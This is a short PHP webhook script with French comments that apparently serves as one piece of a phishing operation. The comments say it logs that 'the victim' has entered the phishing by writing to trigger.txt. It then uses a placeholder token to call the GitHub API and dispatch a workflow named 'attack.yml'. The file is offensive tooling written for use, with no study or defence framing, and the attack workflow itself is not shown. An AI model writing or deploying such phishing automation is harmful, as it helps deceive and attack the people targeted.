<?php
// webhook.php

// Enregistre un marqueur pour indiquer que la victime est entrée dans le phishing
file_put_contents("trigger.txt", "1", FILE_APPEND);

// Déclenche le workflow GitHub Actions via l'API
$token = "votre_token_github"; // Remplacez par votre token GitHub
$repo = "votre_nom_utilisateur/votre_repos"; // Exemple: "pitch/dig"

$data = [
    "ref" => "main"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.github.com/repos/$repo/actions/workflows/attack.yml/dispatches");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Authorization: token $token",
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

echo "Workflow déclenché !";
